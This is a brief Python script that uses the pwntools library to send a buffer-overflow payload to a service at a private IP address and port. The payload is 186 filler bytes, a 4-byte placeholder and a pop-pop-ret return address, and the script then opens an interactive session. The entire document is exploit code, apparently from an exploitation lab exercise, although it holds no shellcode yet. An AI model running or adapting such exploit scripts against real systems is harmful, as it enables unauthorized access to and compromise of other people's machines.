#!/usr/bin/python
from pwn import *

context.log_level='debug'	
host = '192.168.0.12'
port = 3198



def start():
    '''Start the exploit against the target.'''
    return remote(host, port)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

raw_input()

ppr=0x625012AD
pay="A"*186+"B"*4+"\xAD\x12\x50\x62"
io.sendline(pay)
io.interactive()
